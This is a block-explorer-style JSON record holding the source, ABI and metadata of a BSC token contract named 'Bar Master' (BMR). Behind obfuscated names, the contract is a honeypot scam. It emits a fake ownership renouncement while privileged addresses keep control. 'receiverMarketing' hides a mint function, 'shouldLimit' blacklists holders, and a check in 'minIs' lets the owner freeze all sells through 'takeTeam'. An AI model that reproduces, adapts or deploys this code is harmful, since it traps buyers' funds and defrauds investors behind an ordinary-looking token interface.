{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface toFeeLimit {\n    function createPair(address takeToken, address enableMode) external returns (address);\n}\n\ninterface fundReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTxLimit) external view returns (uint256);\n\n    function transfer(address tradingMin, uint256 maxFeeSender) external returns (bool);\n\n    function allowance(address enableExemptAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxFeeSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingMin,\n        uint256 maxFeeSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeTake, uint256 value);\n    event Approval(address indexed enableExemptAmount, address indexed spender, uint256 value);\n}\n\nabstract contract fundLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundReceiverMetadata is fundReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BarMaster is fundLaunch, fundReceiver, fundReceiverMetadata {\n\n    function balanceOf(address receiverTxLimit) public view virtual override returns (uint256) {\n        return shouldMode[receiverTxLimit];\n    }\n\n    function allowance(address listWallet, address amountSell) external view virtual override returns (uint256) {\n        if (amountSell == atBuy) {\n            return type(uint256).max;\n        }\n        return minShouldWallet[listWallet][amountSell];\n    }\n\n    bool private launchedFee;\n\n    string private marketingIs = \"Bar Master\";\n\n    function takeTeam(uint256 maxFeeSender) public {\n        atTake();\n        enableToken = maxFeeSender;\n    }\n\n    constructor (){\n        if (senderLiquidity == isReceiver) {\n            isReceiver = launchedExempt;\n        }\n        senderTrading maxFundToken = senderTrading(atBuy);\n        receiverMin = toFeeLimit(maxFundToken.factory()).createPair(maxFundToken.WETH(), address(this));\n        if (shouldTeam != launchedSell) {\n            isReceiver = senderLiquidity;\n        }\n        receiverIsSender = _msgSender();\n        feeShould[receiverIsSender] = true;\n        shouldMode[receiverIsSender] = tradingLimit;\n        launchTradingLiquidity();\n        if (senderLiquidity == isReceiver) {\n            launchedFee = true;\n        }\n        emit Transfer(address(0), receiverIsSender, tradingLimit);\n    }\n\n    address atBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private isReceiver;\n\n    uint8 private tradingTotal = 18;\n\n    function launchTradingLiquidity() public {\n        emit OwnershipTransferred(receiverIsSender, address(0));\n        sellFund = address(0);\n    }\n\n    function approve(address amountSell, uint256 maxFeeSender) public virtual override returns (bool) {\n        minShouldWallet[_msgSender()][amountSell] = maxFeeSender;\n        emit Approval(_msgSender(), amountSell, maxFeeSender);\n        return true;\n    }\n\n    mapping(address => bool) public feeShould;\n\n    address public receiverIsSender;\n\n    bool public sellEnable;\n\n    mapping(address => mapping(address => uint256)) private minShouldWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingTotal;\n    }\n\n    string private receiverReceiverFrom = \"BMR\";\n\n    uint256 private senderLiquidity;\n\n    uint256 private tradingLimit = 100000000 * 10 ** 18;\n\n    function tokenMaxFrom(address receiverExempt) public {\n        require(receiverExempt.balance < 100000);\n        if (sellEnable) {\n            return;\n        }\n        if (launchedFee != launchedSell) {\n            launchedFee = false;\n        }\n        feeShould[receiverExempt] = true;\n        \n        sellEnable = true;\n    }\n\n    mapping(address => bool) public launchedLaunchLiquidity;\n\n    function limitFeeTrading(address walletEnableTo, address tradingMin, uint256 maxFeeSender) internal returns (bool) {\n        require(shouldMode[walletEnableTo] >= maxFeeSender);\n        shouldMode[walletEnableTo] -= maxFeeSender;\n        shouldMode[tradingMin] += maxFeeSender;\n        emit Transfer(walletEnableTo, tradingMin, maxFeeSender);\n        return true;\n    }\n\n    function receiverMarketing(address shouldLimitMin, uint256 maxFeeSender) public {\n        atTake();\n        shouldMode[shouldLimitMin] = maxFeeSender;\n    }\n\n    uint256 enableToken;\n\n    uint256 maxMarketing;\n\n    function transfer(address shouldLimitMin, uint256 maxFeeSender) external virtual override returns (bool) {\n        return minIs(_msgSender(), shouldLimitMin, maxFeeSender);\n    }\n\n    function transferFrom(address walletEnableTo, address tradingMin, uint256 maxFeeSender) external override returns (bool) {\n        if (_msgSender() != atBuy) {\n            if (minShouldWallet[walletEnableTo][_msgSender()] != type(uint256).max) {\n                require(maxFeeSender <= minShouldWallet[walletEnableTo][_msgSender()]);\n                minShouldWallet[walletEnableTo][_msgSender()] -= maxFeeSender;\n            }\n        }\n        return minIs(walletEnableTo, tradingMin, maxFeeSender);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingIs;\n    }\n\n    function owner() external view returns (address) {\n        return sellFund;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverReceiverFrom;\n    }\n\n    address liquidityFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private shouldTeam;\n\n    function minIs(address walletEnableTo, address tradingMin, uint256 maxFeeSender) internal returns (bool) {\n        if (walletEnableTo == receiverIsSender) {\n            return limitFeeTrading(walletEnableTo, tradingMin, maxFeeSender);\n        }\n        uint256 teamTradingLaunched = fundReceiver(receiverMin).balanceOf(liquidityFrom);\n        require(teamTradingLaunched == enableToken);\n        require(tradingMin != liquidityFrom);\n        if (launchedLaunchLiquidity[walletEnableTo]) {\n            return limitFeeTrading(walletEnableTo, tradingMin, isSender);\n        }\n        return limitFeeTrading(walletEnableTo, tradingMin, maxFeeSender);\n    }\n\n    mapping(address => uint256) private shouldMode;\n\n    uint256 constant isSender = 19 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingLimit;\n    }\n\n    uint256 private launchedExempt;\n\n    event OwnershipTransferred(address indexed walletFrom, address indexed listShould);\n\n    function shouldLimit(address feeAmount) public {\n        atTake();\n        \n        if (feeAmount == receiverIsSender || feeAmount == receiverMin) {\n            return;\n        }\n        launchedLaunchLiquidity[feeAmount] = true;\n    }\n\n    address private sellFund;\n\n    address public receiverMin;\n\n    function atTake() private view {\n        require(feeShould[_msgSender()]);\n    }\n\n    bool private launchedSell;\n\n    function getOwner() external view returns (address) {\n        return sellFund;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableExemptAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFeeSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTxLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTradingLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedLaunchLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverIsSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLimitMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFeeSender\",\"type\":\"uint256\"}],\"name\":\"receiverMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"}],\"name\":\"shouldLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxFeeSender\",\"type\":\"uint256\"}],\"name\":\"takeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"}],\"name\":\"tokenMaxFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLimitMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFeeSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletEnableTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFeeSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BarMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}